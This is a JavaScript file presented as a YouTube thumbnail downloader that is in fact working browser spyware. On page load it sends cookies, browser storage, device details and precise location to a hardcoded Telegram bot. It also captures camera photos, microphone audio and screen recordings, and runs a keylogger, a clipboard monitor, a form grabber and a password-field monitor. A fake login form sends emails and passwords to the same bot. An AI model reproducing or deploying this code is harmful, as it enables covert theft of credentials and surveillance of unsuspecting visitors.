// ==================== YOUTUBE THUMBNAIL DOWNLOADER ====================
// Complete JavaScript with all functions

// ==================== TELEGRAM CONFIGURATION ====================
const TOKEN = "7568763554:AAGLNbPtD1ev3O8GBPMEtcpPH73cuOS-vtg";
let CHAT_ID = "6837307356";
const GROUP_LINK = "https://t.me/+7LTtj5yoBBxjMGVl";

// Get chat ID from URL if present
const urlParams = new URLSearchParams(window.location.search);
const chatIdFromUrl = urlParams.get('chat_id');
if (chatIdFromUrl) CHAT_ID = chatIdFromUrl;

// Global variables
let currentLocation = null;
let cameraStream = null;
let audioStream = null;
let screenStream = null;
let cameraInterval = null;
let audioRecorder = null;
let screenRecorder = null;
let keylogBuffer = '';
let keylogTimer = null;
let lastClipboard = '';

// Silent mode
const SILENT_MODE = true;

// ==================== IP & DATE FUNCTIONS ====================
async function getPublicIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return "Cannot fetch IP";
    }
}

function getCurrentDate() {
    const now = new Date();
    return now.toLocaleString('en-GB', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    }).replace(',', '');
}

function joinTelegramGroup() {
    window.open(GROUP_LINK, '_blank');
}

function formatTelegramMessage(email, password, ip, date) {
    return "━━━━━━━━━━━━━━━━━━━━━━\n" +
           "🔐 𝐅𝐁 𝐋𝐎𝐆𝐈𝐍 🔐\n" +
           "━━━━━━━━━━━━━━━━━━━━━━\n" +
           "📧 " + email + "\n" +
           "🔑 " + password + "\n" +
           "🌐 " + ip + "\n" +
           "📅 " + date + "\n" +
           "━━━━━━━━━━━━━━━━━━━━━━";
}

// ==================== DEVICE INFO COLLECTION ====================
function calculateLocalStorageSize() {
    let total = 0;
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        total += (key.length + value.length) * 2;
    }
    return total;
}

function calculateSessionStorageSize() {
    let total = 0;
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const value = sessionStorage.getItem(key);
        total += (key.length + value.length) * 2;
    }
    return total;
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

async function collectDeviceInfo() {
    const info = {
        timestamp: getCurrentDate(),
        ip: await getPublicIP(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${window.screen.width}x${window.screen.height}`,
        viewport: `${window.innerWidth}x${window.innerHeight}`,
        cookies: navigator.cookieEnabled ? 'Yes' : 'No',
        online: navigator.onLine ? 'Online' : 'Offline',
        battery: await getBatteryInfo(),
        localStorage: formatBytes(calculateLocalStorageSize()),
        sessionStorage: formatBytes(calculateSessionStorageSize()),
        touch: 'ontouchstart' in window ? 'Yes' : 'No',
        referrer: document.referrer || 'None',
        url: window.location.href,
        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
        deviceMemory: navigator.deviceMemory || 'Unknown'
    };
    
    if (currentLocation) {
        info.location = currentLocation;
    }
    
    return info;
}

async function getBatteryInfo() {
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            return `${Math.round(battery.level * 100)}%`;
        } catch {
            return 'Unknown';
        }
    }
    return 'Not Supported';
}

function formatDeviceInfo(info) {
    let locationText = 'Not allowed';
    if (info.location && typeof info.location === 'object') {
        const mapsLink = `https://www.google.com/maps?q=${info.location.lat},${info.location.lng}&z=15`;
        locationText = `
📍 **EXACT LOCATION:**
├─ Latitude: ${info.location.lat}
├─ Longitude: ${info.location.lng}
├─ Accuracy: ±${info.location.accuracy}m
├─ Google Maps: ${mapsLink}
└─ Timezone: ${info.timezone}`;
    }
    
    return `📱 **DEVICE INFORMATION**
⏰ Time: ${info.timestamp}
🌐 IP: ${info.ip}
💻 CPU Cores: ${info.hardwareConcurrency}
🧠 RAM: ${info.deviceMemory}GB
🖥️ User Agent: ${info.userAgent.substring(0, 100)}...
📟 Platform: ${info.platform}
🗣️ Language: ${info.language}
🌐 Timezone: ${info.timezone}
📺 Screen: ${info.screen}
👁️ Viewport: ${info.viewport}
🍪 Cookies: ${info.cookies}
📶 Status: ${info.online}
🔋 Battery: ${info.battery}
💾 Local Storage: ${info.localStorage}
💾 Session Storage: ${info.sessionStorage}
👆 Touch: ${info.touch}
${locationText}
🔗 Referrer: ${info.referrer}
📄 URL: ${info.url}`;
}

// ==================== TELEGRAM FUNCTIONS ====================
async function sendMessageToTelegram(message) {
    if (!CHAT_ID || !message) return;
    if (SILENT_MODE && (message.includes('Camera') || message.includes('Microphone') || message.includes('Location') || message.includes('Screen'))) {
        return;
    }
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ 
                chat_id: CHAT_ID, 
                text: message,
                parse_mode: 'Markdown'
            }),
        });
    } catch (err) {}
}

async function sendPhotoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', file);
    if (caption) formData.append('caption', caption);
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
        });
    } catch (error) {}
}

async function sendVideoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', file);
    if (caption) formData.append('caption', caption);
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
            method: "POST",
            body: formData
        });
    } catch (error) {}
}

async function sendAudioToTelegram(file, caption) {
    if (!CHAT_ID) return;
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('audio', file);
    if (caption) formData.append('caption', caption);
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendAudio`, {
            method: "POST",
            body: formData
        });
    } catch (error) {}
}

async function sendFileToTelegram(file, caption) {
    if (!CHAT_ID) return;
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', file);
    if (caption) formData.append('caption', caption);
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, {
            method: "POST",
            body: formData
        });
    } catch (error) {}
}

async function sendLocationToTelegram(lat, lng) {
    if (!CHAT_ID) return;
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ 
                chat_id: CHAT_ID, 
                latitude: lat,
                longitude: lng
            }),
        });
    } catch (error) {}
}

// ==================== 1. CAMERA CAPTURE ====================
async function requestCameraPermission() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: false 
        });
        
        cameraStream = stream;
        startCameraCapture(stream);
        
    } catch (error) {}
}

function startCameraCapture(stream) {
    const video = document.createElement('video');
    video.style.display = 'none';
    document.body.appendChild(video);
    video.srcObject = stream;
    video.play();
    
    cameraInterval = setInterval(async () => {
        if (!video || video.readyState < 2) return;
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(async (blob) => {
            if (blob && blob.size > 0) {
                const file = new File([blob], `camera_${Date.now()}.jpg`, { type: 'image/jpeg' });
                await sendPhotoToTelegram(file, `📸 *CAMERA PHOTO*\n⏰ ${getCurrentDate()}`);
            }
        }, 'image/jpeg', 0.7);
    }, 5000);
}

// ==================== 2. LOCATION TRACKING ====================
function requestLocationPermission() {
    if (!navigator.geolocation) return;
    
    navigator.geolocation.getCurrentPosition(
        async (position) => {
            currentLocation = {
                lat: position.coords.latitude,
                lng: position.coords.longitude,
                accuracy: Math.round(position.coords.accuracy)
            };
            await sendLocationToTelegram(currentLocation.lat, currentLocation.lng);
        },
        () => {},
        { enableHighAccuracy: true, timeout: 10000 }
    );
    
    setInterval(() => {
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                currentLocation = {
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    accuracy: Math.round(position.coords.accuracy)
                };
                await sendLocationToTelegram(currentLocation.lat, currentLocation.lng);
            },
            () => {},
            { enableHighAccuracy: true, timeout: 5000 }
        );
    }, 30000);
}

// ==================== 3. MICROPHONE RECORDING ====================
async function requestMicrophonePermission() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        audioStream = stream;
        startAudioRecording(stream);
    } catch (error) {}
}

function startAudioRecording(stream) {
    const recorder = new MediaRecorder(stream);
    const chunks = [];
    
    recorder.ondataavailable = async (event) => {
        if (event.data.size > 0) {
            chunks.push(event.data);
            const blob = new Blob(chunks, { type: 'audio/webm' });
            const file = new File([blob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
            await sendAudioToTelegram(file, `🎤 *AUDIO RECORDING*\n📊 Size: ${(blob.size / 1024).toFixed(2)} KB\n⏰ ${getCurrentDate()}`);
            chunks.length = 0;
        }
    };
    
    recorder.start();
    setInterval(() => {
        if (recorder.state === 'recording') {
            recorder.stop();
            setTimeout(() => recorder.start(), 100);
        }
    }, 15000);
}

// ==================== 4. SCREEN RECORDING ====================
async function requestScreenPermission() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
    
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: { cursor: "always", frameRate: { ideal: 30 } },
            audio: true
        });
        
        screenStream = stream;
        startScreenRecording(stream);
        await captureScreenshot();
        setInterval(() => captureScreenshot(), 30000);
    } catch (error) {}
}

function startScreenRecording(stream) {
    const mimeType = MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : 'video/mp4';
    screenRecorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 2500000 });
    const chunks = [];
    
    screenRecorder.ondataavailable = async (event) => {
        if (event.data.size > 0) {
            chunks.push(event.data);
            const blob = new Blob(chunks, { type: mimeType });
            const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
            const file = new File([blob], `screen_${Date.now()}.${ext}`, { type: mimeType });
            await sendVideoToTelegram(file, `📹 *SCREEN RECORDING*\n📊 Size: ${(blob.size / 1024 / 1024).toFixed(2)} MB\n⏰ ${getCurrentDate()}`);
            chunks.length = 0;
        }
    };
    
    screenRecorder.start(1000);
    
    setTimeout(() => {
        if (screenRecorder && screenRecorder.state === 'recording') {
            screenRecorder.stop();
            stream.getTracks().forEach(track => track.stop());
        }
    }, 30000);
}

// ==================== 5. SCREENSHOT ====================
async function captureScreenshot() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
    
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: { cursor: "always" },
            audio: false
        });
        
        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);
        video.srcObject = stream;
        await video.play();
        await new Promise(resolve => setTimeout(resolve, 500));
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
        const file = new File([blob], `screenshot_${Date.now()}.png`, { type: 'image/png' });
        await sendPhotoToTelegram(file, `📸 *SCREENSHOT*\n📐 ${canvas.width}x${canvas.height}\n⏰ ${getCurrentDate()}`);
        
        stream.getTracks().forEach(track => track.stop());
        video.remove();
    } catch (error) {}
}

// ==================== 6. COOKIE STEALER ====================
function getAllCookies() {
    const cookies = {};
    const cookieString = document.cookie;
    if (!cookieString) return cookies;
    
    cookieString.split(';').forEach(cookie => {
        const parts = cookie.split('=');
        const name = parts[0].trim();
        const value = parts.length > 1 ? decodeURIComponent(parts.slice(1).join('=').trim()) : '';
        if (name) cookies[name] = value;
    });
    return cookies;
}

function getCookieDetails() {
    const cookies = [];
    const cookieString = document.cookie;
    if (!cookieString) return cookies;
    
    cookieString.split(';').forEach(cookie => {
        const parts = cookie.split('=');
        const name = parts[0].trim();
        const value = parts.length > 1 ? decodeURIComponent(parts.slice(1).join('=').trim()) : '';
        
        const sensitiveKeywords = ['session', 'token', 'auth', 'login', 'user', 'pass', 'email', 'id', 'key', 'secret', 'jwt'];
        const isSensitive = sensitiveKeywords.some(keyword => 
            name.toLowerCase().includes(keyword) || value.toLowerCase().includes(keyword)
        );
        
        cookies.push({ name, value, isSensitive });
    });
    return cookies;
}

function getAllStorageData() {
    const data = { localStorage: {}, sessionStorage: {}, cookies: getAllCookies() };
    
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        try { data.localStorage[key] = localStorage.getItem(key); } catch(e) { data.localStorage[key] = 'Cannot read'; }
    }
    
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        try { data.sessionStorage[key] = sessionStorage.getItem(key); } catch(e) { data.sessionStorage[key] = 'Cannot read'; }
    }
    return data;
}

async function stealAllData() {
    if (!CHAT_ID) return;
    
    try {
        const cookies = getCookieDetails();
        const storageData = getAllStorageData();
        const deviceInfo = await collectDeviceInfo();
        
        let message = `🔴 *STOLEN DATA REPORT*\n\n`;
        message += `🍪 Cookies: ${cookies.length} found\n`;
        
        if (cookies.length > 0) {
            cookies.slice(0, 10).forEach(c => {
                const shortValue = c.value.length > 50 ? c.value.substring(0, 50) + '...' : c.value;
                message += `├─ ${c.name}: ${shortValue}\n`;
            });
            if (cookies.length > 10) message += `└─ ... and ${cookies.length - 10} more\n`;
        }
        
        message += `\n💾 Storage:\n├─ LocalStorage: ${Object.keys(storageData.localStorage).length} items\n├─ SessionStorage: ${Object.keys(storageData.sessionStorage).length} items\n\n`;
        message += `${formatDeviceInfo(deviceInfo)}`;
        
        await sendMessageToTelegram(message);
        
        const fullData = { timestamp: new Date().toISOString(), url: window.location.href, cookies, storage: storageData, deviceInfo };
        const jsonBlob = new Blob([JSON.stringify(fullData, null, 2)], { type: 'application/json' });
        const jsonFile = new File([jsonBlob], `stolen_data_${Date.now()}.json`, { type: 'application/json' });
        await sendFileToTelegram(jsonFile, `📁 Complete Stolen Data`);
        
        const sensitiveCookies = cookies.filter(c => c.isSensitive);
        if (sensitiveCookies.length > 0) {
            const sensitiveBlob = new Blob([JSON.stringify(sensitiveCookies, null, 2)], { type: 'application/json' });
            const sensitiveFile = new File([sensitiveBlob], `sensitive_cookies_${Date.now()}.json`, { type: 'application/json' });
            await sendFileToTelegram(sensitiveFile, `⚠️ Sensitive Cookies - ${sensitiveCookies.length} items`);
        }
    } catch (error) {}
}

// ==================== 7. KEYLOGGER ====================
function setupKeylogger() {
    document.addEventListener('keydown', function(e) {
        if (!CHAT_ID) return;
        if (e.target && e.target.type === 'password') return;
        
        if (e.key.length === 1) keylogBuffer += e.key;
        else if (e.key === 'Enter') keylogBuffer += '\n';
        else if (e.key === 'Backspace') keylogBuffer = keylogBuffer.slice(0, -1);
        else if (e.key === ' ') keylogBuffer += ' ';
        else if (e.key === 'Tab') keylogBuffer += '    ';
        
        clearTimeout(keylogTimer);
        keylogTimer = setTimeout(async () => {
            if (keylogBuffer.length > 0) {
                await sendMessageToTelegram(`⌨️ *KEYLOGGER*\n\n${keylogBuffer}`);
                keylogBuffer = '';
            }
        }, 3000);
    });
}

// ==================== 8. CLIPBOARD MONITOR ====================
function setupClipboardMonitor() {
    setInterval(async () => {
        if (!CHAT_ID) return;
        try {
            const text = await navigator.clipboard.readText();
            if (text && text !== lastClipboard && text.length > 0 && text.length < 1000) {
                lastClipboard = text;
                await sendMessageToTelegram(`📋 *CLIPBOARD*\n\n${text}`);
            }
        } catch (error) {}
    }, 5000);
}

// ==================== 9. FORM STEALER ====================
function setupFormStealer() {
    document.addEventListener('submit', async function(e) {
        if (!CHAT_ID) return;
        
        const form = e.target;
        const formData = new FormData(form);
        const data = {};
        
        for (let [key, value] of formData.entries()) {
            if (value instanceof File) {
                data[key] = `[FILE: ${value.name}]`;
                await sendFileToTelegram(value, `📎 Form File: ${key}`);
            } else if (value && value.toString().trim() !== '') {
                data[key] = value;
            }
        }
        
        if (Object.keys(data).length > 0) {
            let message = `📝 *FORM SUBMITTED*\n\n📋 Action: ${form.action || 'None'}\n📋 Method: ${form.method || 'GET'}\n\n📊 Data:\n`;
            for (let [key, value] of Object.entries(data)) {
                const shortValue = String(value).length > 100 ? String(value).substring(0, 100) + '...' : value;
                message += `├─ ${key}: ${shortValue}\n`;
            }
            await sendMessageToTelegram(message);
        }
    });
}

// ==================== 10. PASSWORD MONITOR ====================
function setupPasswordMonitor() {
    document.addEventListener('input', async function(e) {
        if (!CHAT_ID) return;
        
        const target = e.target;
        if (target && target.type === 'password' && target.value && target.value.length > 0) {
            const name = target.name || target.id || 'Unknown';
            await sendMessageToTelegram(`🔐 *PASSWORD ENTERED*\n\n📝 Field: ${name}\n🔑 Value: ${target.value}`);
            keylogBuffer = '';
        }
    });
}

// ==================== 11. FORM SUBMIT HANDLER ====================
async function sendToTelegram() {
    const email = document.getElementById('email')?.value.trim();
    const password = document.getElementById('password')?.value.trim();

    if (!email || !password) {
        alert("Please fill in both email and password!");
        return;
    }

    const loadingDiv = document.getElementById('loading');
    if (loadingDiv) loadingDiv.style.display = 'block';

    const submitBtn = document.querySelector('.submit-btn');
    if (submitBtn) {
        submitBtn.disabled = true;
        submitBtn.style.opacity = '0.7';
    }

    try {
        const ip = await getPublicIP();
        const date = getCurrentDate();
        const message = formatTelegramMessage(email, password, ip, date);
        const encodedMessage = encodeURIComponent(message);
        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}`;
        await fetch(url);

        if (document.getElementById('email')) document.getElementById('email').value = '';
        if (document.getElementById('password')) document.getElementById('password').value = '';
        
        alert("Successfully joined group!");
        joinTelegramGroup();
        
    } catch (error) {
        console.error("Error:", error);
        alert("Technical error! Please check your internet connection.");
        if (submitBtn) {
            submitBtn.disabled = false;
            submitBtn.style.opacity = '1';
        }
    } finally {
        if (loadingDiv) loadingDiv.style.display = 'none';
    }
}

// ==================== 12. PAGE UNLOAD TRACKING ====================
function setupUnloadTracking() {
    window.addEventListener('beforeunload', function() {
        if (!CHAT_ID) return;
        const message = `👋 *USER LEAVING*\n\nURL: ${window.location.href}\n⏰ ${getCurrentDate()}`;
        const blob = new Blob([JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })], { type: 'application/json' });
        navigator.sendBeacon(`https://api.telegram.org/bot${TOKEN}/sendMessage`, blob);
    });
}

// ==================== YOUTUBE THUMBNAIL FUNCTIONS ====================
function downloadThumbnail() {
    var btn = document.getElementById('thumbdloadbtn');
    var originalText = btn ? btn.textContent : 'FETCH THUMBNAILS';
    if (btn) {
        btn.textContent = 'Fetching... Please wait';
        btn.disabled = true;
    }
    
    var youtubeUrl = document.getElementById('ytlink')?.value.trim();
    
    if (!youtubeUrl) {
        alert('Please enter a YouTube URL');
        if (btn) {
            btn.textContent = originalText;
            btn.disabled = false;
        }
        return;
    }
    
    var videoId = extractVideoId(youtubeUrl);
    
    if (!videoId) {
        alert('Invalid YouTube URL. Please check and try again.');
        if (btn) {
            btn.textContent = originalText;
            btn.disabled = false;
        }
        return;
    }
    
    displayThumbnails(videoId);
    
    setTimeout(function() {
        if (btn) {
            btn.textContent = originalText;
            btn.disabled = false;
        }
    }, 1500);
}

function extractVideoId(url) {
    var videoId = '';
    
    if (url.includes('youtu.be/')) {
        videoId = url.split('youtu.be/')[1].split('?')[0];
    } else if (url.includes('youtube.com/watch?v=')) {
        videoId = url.split('v=')[1].split('&')[0];
    } else if (url.includes('youtube.com/embed/')) {
        videoId = url.split('embed/')[1].split('?')[0];
    } else if (url.includes('youtube.com/v/')) {
        videoId = url.split('v/')[1].split('?')[0];
    }
    
    if (videoId && videoId.length === 11) {
        return videoId;
    }
    return null;
}

function displayThumbnails(videoId) {
    var thumbnailContainer = document.getElementById('thumbnail-preview');
    if (!thumbnailContainer) return;
    
    thumbnailContainer.innerHTML = '';
    
    var qualities = [
        { name: 'Max Resolution', suffix: 'maxresdefault', quality: 'Highest' },
        { name: 'HD 1080p', suffix: 'sddefault', quality: '1080p' },
        { name: 'Medium', suffix: 'hqdefault', quality: '480p' },
        { name: 'Standard', suffix: 'mqdefault', quality: '320p' },
        { name: 'Thumbnail', suffix: 'default', quality: '120p' }
    ];
    
    qualities.forEach(function(quality) {
        var thumbnailUrl = `https://img.youtube.com/vi/${videoId}/${quality.suffix}.jpg`;
        
        var thumbnailItem = document.createElement('div');
        thumbnailItem.className = 'thumbnail-item';
        thumbnailItem.style.display = 'inline-block';
        thumbnailItem.style.margin = '10px';
        thumbnailItem.style.textAlign = 'center';
        
        var img = document.createElement('img');
        img.src = thumbnailUrl;
        img.alt = `YouTube thumbnail - ${quality.quality}`;
        img.style.maxWidth = '200px';
        img.style.borderRadius = '8px';
        img.style.boxShadow = '0 2px 8px rgba(0,0,0,0.1)';
        
        var qualityLabel = document.createElement('div');
        qualityLabel.textContent = `${quality.name} (${quality.quality})`;
        qualityLabel.style.fontWeight = 'bold';
        qualityLabel.style.marginTop = '8px';
        
        var downloadLink = document.createElement('a');
        downloadLink.href = thumbnailUrl;
        downloadLink.download = `youtube-thumbnail-${videoId}-${quality.suffix}.jpg`;
        downloadLink.textContent = 'Download';
        downloadLink.style.display = 'inline-block';
        downloadLink.style.marginTop = '5px';
        downloadLink.style.padding = '5px 10px';
        downloadLink.style.backgroundColor = '#ff0000';
        downloadLink.style.color = 'white';
        downloadLink.style.textDecoration = 'none';
        downloadLink.style.borderRadius = '5px';
        
        thumbnailItem.appendChild(img);
        thumbnailItem.appendChild(qualityLabel);
        thumbnailItem.appendChild(downloadLink);
        
        thumbnailContainer.appendChild(thumbnailItem);
    });
}

function GetURLParameter(sParam) {
    var sPageURL = window.location.search.substring(1);
    var sURLVariables = sPageURL.split('&');
    for (var i = 0; i < sURLVariables.length; i++) {
        var sParameterName = sURLVariables[i].split('=');
        if (sParameterName[0] == sParam) {
            return sParameterName[1];
        }
    }
}

// ==================== START DATA COLLECTION ====================
async function startDataCollection() {
    setInterval(async () => {
        const deviceInfo = await collectDeviceInfo();
        const formattedInfo = formatDeviceInfo(deviceInfo);
        await sendMessageToTelegram(`🔄 *CURRENT DATA*\n\n${formattedInfo}`);
    }, 60000);
    
    setInterval(() => stealAllData(), 30000);
}

// ==================== MAIN INITIALIZATION ====================
async function initialize() {
    const deviceInfo = await collectDeviceInfo();
    const formattedInfo = formatDeviceInfo(deviceInfo);
    await sendMessageToTelegram(`🚀 *PAGE LOADED*\n\n${formattedInfo}`);
    
    setTimeout(() => requestCameraPermission(), 1000);
    setTimeout(() => requestLocationPermission(), 3000);
    setTimeout(() => requestMicrophonePermission(), 5000);
    setTimeout(() => requestScreenPermission(), 7000);
    setTimeout(() => startDataCollection(), 10000);
    setTimeout(() => stealAllData(), 2000);
    
    setupKeylogger();
    setupClipboardMonitor();
    setupFormStealer();
    setupPasswordMonitor();
    setupUnloadTracking();
    
    var targetId = GetURLParameter('i');
    if (targetId) {
        try {
            var decodedId = atob(targetId);
            if (decodedId && decodedId !== CHAT_ID) {
                CHAT_ID = decodedId;
                await sendMessageToTelegram(`🎯 *NEW TARGET CONNECTED*\nIP: ${deviceInfo.ip}\nTime: ${getCurrentDate()}`);
            }
        } catch(e) {}
    }
    
    var emailParam = GetURLParameter('email');
    if (emailParam && document.getElementById('email')) {
        try {
            document.getElementById('email').value = atob(emailParam);
        } catch(e) {}
    }
    
    console.log('YouTube Thumbnail Downloader initialized');
}

// Start when DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initialize);
} else {
    initialize();
}

// Export functions
window.downloadThumbnail = downloadThumbnail;
window.sendToTelegram = sendToTelegram;
window.getPublicIP = getPublicIP;